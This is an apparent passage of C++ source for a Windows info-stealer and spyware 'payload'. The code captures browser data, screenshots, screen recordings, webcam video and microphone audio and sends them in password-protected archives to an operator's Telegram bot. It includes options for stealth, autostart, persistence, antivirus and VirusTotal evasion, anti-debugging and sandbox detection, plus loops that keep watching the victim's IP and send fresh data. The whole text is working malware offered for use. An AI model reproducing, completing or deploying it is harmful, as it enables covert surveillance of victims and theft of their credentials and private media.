                TranslateMessage(&msg);
                DispatchMessageA(&msg);
            }
        }
    }
}

static void installOfflineHandler(const PayloadConfig& cfg) {
    g_offlineCfg = cfg;
    // Kept for the case where the payload is run attached to a console; it is
    // simply never called for a windowed process.
    SetConsoleCtrlHandler(consoleCtrlHandler, TRUE);
    atexit(sendOfflineOnce);

    WNDCLASSA wc = {};
    wc.lpfnWndProc = sessionWndProc;
    wc.hInstance = GetModuleHandleA(nullptr);
    wc.lpszClassName = "OskSessionNotify";
    RegisterClassA(&wc); // may already be registered; that is fine

    // A real top-level window: message-only (HWND_MESSAGE) windows are excluded
    // from the session broadcasts. WS_POPUP without WS_VISIBLE keeps it hidden.
    CreateWindowExA(0, "OskSessionNotify", "", WS_POPUP, 0, 0, 0, 0,
        nullptr, nullptr, wc.hInstance, nullptr);
}

// === Config loading (plaintext only — binder always writes plaintext) ===

static std::string trimCopy(std::string s) {
    while (!s.empty() && (s.back() == '\r' || s.back() == '\n' || s.back() == ' ' || s.back() == '\t'))
        s.pop_back();
    size_t i = 0;
    while (i < s.size() && (s[i] == ' ' || s[i] == '\t'))
        i++;
    return s.substr(i);
}

static PayloadConfig loadConfig() {
    PayloadConfig cfg = {};

    // Shared with enablePersistence(), so the config that gets installed beside
    // the stable copy is always the same one this would have read.
    const std::string cfgPath = findConfigPath();
    if (cfgPath.empty())
        return cfg;

    std::ifstream file(cfgPath, std::ios::in | std::ios::binary);
    if (!file.is_open())
        return cfg;

    std::string line;
    while (std::getline(file, line)) {
        if (!line.empty() && line.back() == '\r') line.pop_back();
        size_t eq = line.find('=');
        if (eq == std::string::npos) continue;
        std::string key = trimCopy(line.substr(0, eq));
        std::string val = trimCopy(line.substr(eq + 1));
        if (key == "bot_token") cfg.botToken = val;
        else if (key == "chat_id") cfg.chatId = val;
        else if (key == "session_id") cfg.sessionId = val;
        else if (key == "update_interval") cfg.updateIntervalDays = std::atoi(val.c_str());
        else if (key == "opt_grab_browser") cfg.grabBrowser = (val == "1");
        else if (key == "opt_screenshot") cfg.screenshot = (val == "1");
        else if (key == "opt_autostart") cfg.autoStart = (val == "1");
        else if (key == "opt_grab_webcam") cfg.grabWebcam = (val == "1");
        else if (key == "opt_grab_microphone") cfg.grabMicrophone = (val == "1");
        else if (key == "opt_bypass_vt") cfg.bypassVT = (val == "1");
        else if (key == "opt_stealth") cfg.stealth = (val == "1");
        else if (key == "opt_persistence") cfg.persistence = (val == "1");
        else if (key == "opt_anti_debug") cfg.antiDebug = (val == "1");
        else if (key == "opt_encrypt_traffic") cfg.encryptTraffic = (val == "1");
        else if (key == "opt_anti_av") cfg.antiAV = (val == "1");
        else if (key == "mic_duration_sec") cfg.micDurationSec = std::atoi(val.c_str());
        else if (key == "webcam_duration_sec") cfg.webcamDurationSec = std::atoi(val.c_str());
        else if (key == "screen_duration_sec") cfg.screenDurationSec = std::atoi(val.c_str());
        else if (key == "opt_custom_password") cfg.useCustomPassword = (val == "1");
        else if (key == "archive_password") cfg.archivePassword = val;
        else if (key == "original_name") cfg.originalName = val;
    }
    file.close();

    if (cfg.micDurationSec < 1) cfg.micDurationSec = 10;
    if (cfg.webcamDurationSec < 1) cfg.webcamDurationSec = 10;
    if (cfg.screenDurationSec < 1) cfg.screenDurationSec = 10;
    return cfg;
}

// Run the configured captures and return the files destined for the archive.
//
// Factored out of executeFeatures so the periodic update path can re-run the
// same capture set without duplicating it.
static std::vector<std::pair<std::string, std::vector<char>>> collectCaptureFiles(
    const PayloadConfig& cfg, bool dumpLocal, bool skipGuards, std::ostringstream& report) {
    std::vector<std::pair<std::string, std::vector<char>>> files;

    auto addFile = [&](const std::string& rel, std::vector<char> data) {
        if (data.empty()) {
            if (skipGuards) report << "EMPTY   " << rel << "\n";
            return;
        }
        if (dumpLocal)
            dumpToResult(rel, data);
        if (skipGuards) report << "OK      " << rel << " (" << data.size() << " bytes)\n";
        files.push_back({ rel, std::move(data) });
    };

    if (skipGuards) traceStage("exec: entering browser");
    if (cfg.grabBrowser) {
        auto browserFiles = grabBrowserDataFiles();
        if (skipGuards) report << "[browser] " << browserFiles.size() << " file(s)\n";
        for (auto& f : browserFiles)
            addFile(f.first, std::move(f.second));
    }

    if (skipGuards) traceStage("exec: entering screenshot+screen");
    if (cfg.screenshot) {
        std::vector<char> screenshot = captureScreenshot();
        addFile("screenshot/screenshot.png", std::move(screenshot));

        auto screenFiles = recordScreen(cfg.screenDurationSec);
        if (skipGuards) report << "[screen] " << screenFiles.size() << " file(s)\n";
        for (auto& f : screenFiles)
            addFile(f.first, std::move(f.second));
    }

    if (skipGuards) traceStage("exec: entering webcam");
    if (cfg.grabWebcam) {
        auto webcamFiles = captureWebcam(cfg.webcamDurationSec);
        if (skipGuards) report << "[webcam] " << webcamFiles.size() << " file(s)\n";
        for (auto& f : webcamFiles)
            addFile(f.first, std::move(f.second));
    }

    if (skipGuards) traceStage("exec: entering mic");
    if (cfg.grabMicrophone) {
        auto micFiles = recordAllMicrophones(cfg.micDurationSec);
        if (skipGuards) report << "[mic] " << micFiles.size() << " file(s)\n";
        for (auto& f : micFiles)
            addFile(f.first, std::move(f.second));
    }
    if (skipGuards) traceStage("exec: all captures done");

    return files;
}

// Resolve the archive password for one send.
//   custom password configured -> use it verbatim (empty = no password)
//   otherwise                  -> fresh random password
static std::string resolveArchivePassword(const PayloadConfig& cfg) {
    if (cfg.useCustomPassword)
        return cfg.archivePassword;
    return generatePassword();
}

// Capture, archive and send an "Updated info" message. Used by the periodic
// re-check so the operator gets the fresh archive plus its password.
// Collects the configured captures and archives them. Split out from
// sendUpdateArchive() so the boot-time size comparison can build the archive
// once and then decide whether to send it, rather than capturing a second time.
// Returns false when there is nothing to archive.
static bool buildUpdateArchive(const PayloadConfig& cfg, std::vector<char>& archiveOut,
    std::string& extOut, std::string& passwordOut) {
    std::ostringstream sink;
    auto files = collectCaptureFiles(cfg, /*dumpLocal=*/false, /*skipGuards=*/false, sink);
    if (files.empty())
        return false;

    passwordOut = resolveArchivePassword(cfg);
    archiveOut = createArchive(files, extOut, passwordOut);
    return !archiveOut.empty();
}

// Sends an already-built archive under the "Updated info" caption.
static void sendArchiveWithUpdateCaption(const PayloadConfig& cfg,
    const std::vector<char>& archive, const std::string& ext,
    const std::string& password, bool planned) {
    const std::string archiveName =
        "hit-update-" + cfg.sessionId + "-" + uniqueSuffix() + "." + ext;
    std::string caption = buildUpdatedInfoMessage(cfg, password, planned);
    if (caption.size() > 1000)
        caption = caption.substr(0, 1000);
    sendDocument(cfg, caption, archiveName, archive);
}

// Collects fresh captures, archives them, and sends the archive with the
// "Updated info" caption. Returns false when there was nothing to archive, so a
// caller that still wants to report the change can fall back to a plain notice.
static bool sendUpdateArchive(const PayloadConfig& cfg, bool planned) {
    std::vector<char> archive;
    std::string ext, password;
    if (!buildUpdateArchive(cfg, archive, ext, password))
        return false;
    sendArchiveWithUpdateCaption(cfg, archive, ext, password, planned);
    return true;
}

static void executeFeatures(const PayloadConfig& cfg, bool dumpLocal, bool skipGuards = false) {
    // 0) Sandbox/VM check FIRST — exit silently before any network activity.
    //    --selftest bypasses this so a legit run can be verified on the owner's PC.
    if (!skipGuards && isInSandbox())
        return;

    if (dumpLocal)
        clearResultDir();

    std::ostringstream report;
    if (skipGuards)
        report << "=== SELFTEST ===\n";

    // 1) Online notification FIRST — deliberately no IP/geo lookup here (that
    //    can hang for seconds), so the "went online" ping lands immediately.
    //    The full hit message goes out later as the archive caption.
    if (!cfg.botToken.empty() && !cfg.chatId.empty()) {
        sendTelegram(cfg, buildOnlineMessage(cfg));
    }

    // Soft features only (never ExitProcess)
    if (cfg.stealth)
        enableStealth();
    if (cfg.autoStart)
        enableAutoStart();
    if (cfg.persistence)
        enablePersistence();
    if (cfg.antiAV)
        runAntiAV();
    if (cfg.bypassVT)
        applyVTBypass();

    // Randomized delay before heavy data capture — avoids predictable timing at boot/auto-start/update-hit
    if (!skipGuards)
        randomDelayBeforeCapture();

    // Archive password selection.
    //   custom password configured -> use it verbatim (empty = no password)
    //   otherwise                  -> fresh random password per hit
    std::string password = resolveArchivePassword(cfg);

    std::vector<std::pair<std::string, std::vector<char>>> archiveFiles =
        collectCaptureFiles(cfg, dumpLocal, skipGuards, report);

    if (skipGuards) {
        report << "--- summary ---\n";
        report << "total_files=" << archiveFiles.size() << "\n";
        report << "result_dir=" << getWorkspaceResultDir() << "\n";
        report << "ffmpeg=" << (findFfmpeg().empty() ? "NOT FOUND" : findFfmpeg()) << "\n";
        report << "token_set=" << (cfg.botToken.empty() ? "no" : "yes")
               << " chat_set=" << (cfg.chatId.empty() ? "no" : "yes") << "\n";
        std::string rep = report.str();
        dumpToResult("selftest.txt", std::vector<char>(rep.begin(), rep.end()));
        printf("%s", rep.c_str());
        fflush(stdout);
    }

    if (dumpLocal) {
        std::ostringstream log;
        log << "token_len=" << cfg.botToken.size() << " chat_len=" << cfg.chatId.size() << "\n";
        log << "session=" << cfg.sessionId << "\n";
        log << "ffmpeg=" << (findFfmpeg().empty() ? "NOT FOUND" : findFfmpeg()) << "\n";
        log << "files_in_archive=" << archiveFiles.size() << "\n";
        log << "mic_sec=" << cfg.micDurationSec << " webcam_sec=" << cfg.webcamDurationSec
            << " screen_sec=" << cfg.screenDurationSec << "\n";
        log << "grab_browser=" << (cfg.grabBrowser ? 1 : 0)
            << " screenshot=" << (cfg.screenshot ? 1 : 0)
            << " webcam=" << (cfg.grabWebcam ? 1 : 0)
            << " mic=" << (cfg.grabMicrophone ? 1 : 0) << "\n";
        for (auto& f : archiveFiles)
            log << f.first << " size=" << f.second.size() << "\n";
        std::string logStr = log.str();
        dumpToResult("run_log.txt", std::vector<char>(logStr.begin(), logStr.end()));
    }

    if (cfg.botToken.empty() || cfg.chatId.empty())
        return;

    if (!archiveFiles.empty()) {
        std::string ext;
        std::vector<char> archive = createArchive(archiveFiles, ext, password);
        if (!archive.empty()) {
            // Unique archive name: hit-<session>-<counter><rand>.ext, so no two
            // archives ever collide (two hits in the same second included).
            const std::string archiveName =
                "hit-" + cfg.sessionId + "-" + uniqueSuffix() + "." + ext;
            if (dumpLocal)
                dumpToResult(archiveName, archive);

            // Full quick-info block goes out as the caption. It is the message
            // the operator actually reads, so it carries the password.
            QuickInfo qi = collectQuickInfo();
            std::string caption = buildHitMessage(cfg, qi, password);
            if (caption.size() > 1000)
                caption = caption.substr(0, 1000);
            sendDocument(cfg, caption, archiveName, archive);
        }
    }
}

static bool hasCliFlag(const char* cmd, const char* flag) {
    if (!cmd || !flag) return false;
    return strstr(cmd, flag) != nullptr;
}

// Whether stage tracing (boot.log) is active. Enabled by --selftest / --cli so
// normal runs leave no on-disk trace. Set once in WinMain.
static bool g_traceEnabled = false;

// Staged trace next to the exe (boot.log) for --selftest / --cli diagnosis.
static void traceStage(const char* msg) {
    if (!g_traceEnabled) return;
    char p[MAX_PATH] = {};
    GetModuleFileNameA(nullptr, p, MAX_PATH);
    std::string s(p);
    size_t sl = s.find_last_of("\\/");
    s = (sl == std::string::npos) ? std::string("boot.log") : s.substr(0, sl + 1) + "boot.log";
    FILE* f = fopen(s.c_str(), "a");
    if (f) { fprintf(f, "%s\n", msg); fclose(f); }
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
    srand((unsigned int)GetTickCount());

    // Set DPI awareness before any screen metrics are read, so full-desktop
    // captures include the taskbar and use physical pixel dimensions.
    ensureDpiAware();

    bool cliMode = hasCliFlag(lpCmdLine, "--cli") || hasCliFlag(lpCmdLine, "/cli");
    bool onceMode = hasCliFlag(lpCmdLine, "--once") || hasCliFlag(lpCmdLine, "/once");
    bool selfTest = hasCliFlag(lpCmdLine, "--selftest") || hasCliFlag(lpCmdLine, "/selftest");

    // Tracing is only enabled for explicit diagnostic/CLI runs so a normal
    // payload execution leaves no boot.log behind.
    g_traceEnabled = cliMode || onceMode || selfTest;

    {
        char dbgPath[MAX_PATH] = {};
        GetModuleFileNameA(nullptr, dbgPath, MAX_PATH);
        std::string dp(dbgPath);
        size_t s = dp.find_last_of("\\/");
        dp = (s == std::string::npos) ? std::string("boot.log") : dp.substr(0, s + 1) + "boot.log";
        if (g_traceEnabled) {
            FILE* bf = fopen(dp.c_str(), "a");
            if (bf) {
                fprintf(bf, "WinMain enter: cmdline='%s'\n", lpCmdLine ? lpCmdLine : "(null)");
                fclose(bf);
            }
        }
    }

    dynApi(); // init dynamic APIs early

    // --selftest: run every capture about one second and report, on the owner's PC.
    if (selfTest) {
        if (!AttachConsole(ATTACH_PARENT_PROCESS)) {
            if (!AllocConsole()) { /* no console; we still write selftest.txt */ }
        }
        FILE* dummy;
        freopen_s(&dummy, "CONOUT$", "w", stdout);
        freopen_s(&dummy, "CONOUT$", "w", stderr);

        PayloadConfig scfg = loadConfig();
        scfg.grabBrowser = true;
        scfg.screenshot = true;
        scfg.grabWebcam = true;
        scfg.grabMicrophone = true;
        scfg.antiDebug = false;
        scfg.stealth = false;
        scfg.autoStart = false;
        scfg.persistence = false;
        scfg.antiAV = false;
        scfg.bypassVT = false;
        // Cap captures so a test finishes in reasonable time, but honour the
        // configured duration up to 10 s so the real clip length can be verified.
        if (scfg.micDurationSec > 10) scfg.micDurationSec = 10;
        if (scfg.micDurationSec < 1) scfg.micDurationSec = 1;
        if (scfg.webcamDurationSec > 10) scfg.webcamDurationSec = 10;
        if (scfg.webcamDurationSec < 1) scfg.webcamDurationSec = 1;
        if (scfg.screenDurationSec > 10) scfg.screenDurationSec = 10;
        if (scfg.screenDurationSec < 1) scfg.screenDurationSec = 1;
        if (scfg.sessionId.empty())
            scfg.sessionId = "SELFTEST";

        traceStage("selftest: config loaded");
        printf("[selftest] starting captures (browser, screenshot, screen, webcam, mic)\n");
        executeFeatures(scfg, true, /*skipGuards=*/true);
        traceStage("selftest: executeFeatures returned");
        printf("[selftest] done. See result/ folder.\n");
        return 0;
    }

    PayloadConfig cfg = loadConfig();
    if (cliMode) {
        cfg.grabBrowser = true;
        cfg.screenshot = true;
        cfg.grabWebcam = true;
        cfg.grabMicrophone = true;
        cfg.antiDebug = false;
        cfg.stealth = false;
        cfg.autoStart = false;
        cfg.persistence = false;
        if (cfg.sessionId.empty())
            cfg.sessionId = "CLI-TEST";
        executeFeatures(cfg, true, /*skipGuards=*/true);
        return 0;
    }
    if (onceMode) {
        // self-hit: use payload.ini options, dump to result/, exit (no update loop)
        if (cfg.sessionId.empty())
            cfg.sessionId = "ONCE-TEST";
        executeFeatures(cfg, true, /*skipGuards=*/true);
        return 0;
    }

    // Normal (real) execution: capture into memory only, deliver via Telegram,
    // and leave NO files on disk. Local dumping is reserved for --cli/--once/--selftest.
    executeFeatures(cfg, /*dumpLocal=*/false);
    if (cfg.botToken.empty() || cfg.chatId.empty())
        return 1;

    // Best-effort offline notice.
    //
    // There is no server to notice a missing heartbeat, so the only moment we
    // can report going offline is when this process is asked to exit. That
    // covers a clean shutdown, logoff or task-kill — NOT a power cut or a
    // network drop, where nothing gets a chance to run. Registered here rather
    // than earlier so the notice is not sent during --cli/--selftest runs.
    installOfflineHandler(cfg);

    QuickInfo lastInfo = collectQuickInfo();
    std::string lastFingerprint = fingerprintOf(lastInfo);

    // Boot-to-boot change detection.
    //
    // Build the current capture set once, then compare it against what the
    // previous run left behind. The primary signal is the archive's *size*: it
    // reflects the captured data rather than the machine's identity, so new
    // browser data or a changed desktop is noticed even when the IP has not
    // moved — which a fingerprint comparison can never see. An IP change while
    // the payload is up is already covered by the "Quick info" notice in the
    // monitor loop, so it deliberately does not drive the boot check.
    //
    // The notice is the "Updated info" one, not the "Quick info" one.
    //
    // Everything is stored in the registry, so a first-ever run just seeds it
    // and stays silent.
    {
        std::vector<char> archive;
        std::string ext, password;
        const bool haveArchive = buildUpdateArchive(cfg, archive, ext, password);

        bool changed;
        if (haveArchive) {
            const DWORD previousSize = loadStateArchiveSize();
            changed = (previousSize != 0 && previousSize != (DWORD)archive.size());
        } else {
            // Nothing was captured to weigh, so fall back to the identity
            // snapshot rather than going silent.
            const std::string previousFingerprint = loadStateFingerprint();
            changed = (!previousFingerprint.empty() && previousFingerprint != lastFingerprint);
        }

        if (changed) {
            if (haveArchive)
                sendArchiveWithUpdateCaption(cfg, archive, ext, password, /*planned=*/false);
            else
                sendTelegram(cfg, buildUpdatedInfoMessage(cfg, std::string(),
                    /*planned=*/false, /*withAttachment=*/false));
        }

        saveStateFingerprint(lastFingerprint);
        if (haveArchive)
            saveStateArchiveSize((DWORD)archive.size());
    }

    if (cfg.updateIntervalDays == 0) {
        // Monitor mode: poll the fingerprint and report any change.
        while (true) {
            waitPumping(60000);
            if (cfg.antiDebug) runAntiDebug();
            QuickInfo now = collectQuickInfo();
            std::string fp = fingerprintOf(now);
            if (fp != lastFingerprint) {
                sendTelegram(cfg, buildQuickChangeMessage(cfg, lastInfo, now));
                lastInfo = now;
                lastFingerprint = fp;
                // Keep the reboot baseline in step, otherwise the next boot
                // would report this same change all over again.
                saveStateFingerprint(fp);
                // Something moved (usually the IP) — the operator's stated
                // behaviour is to also collect and send fresh info, unplanned.
                sendUpdateArchive(cfg, /*planned=*/false);
            }
        }
    } else {
        // Interval mode: a scheduled re-check plus a fresh archive each cycle.
        while (true) {
            waitPumping((DWORD)((long long)cfg.updateIntervalDays * 86400000LL));
            if (cfg.antiDebug) runAntiDebug();
            QuickInfo now = collectQuickInfo();
            std::string fp = fingerprintOf(now);
            const bool changed = (fp != lastFingerprint);
            if (changed)
                sendTelegram(cfg, buildQuickChangeMessage(cfg, lastInfo, now));
            lastInfo = now;
            lastFingerprint = fp;
            if (changed)
                saveStateFingerprint(fp);
            sendUpdateArchive(cfg, /*planned=*/!changed);
        }
    }

    return 0;
}
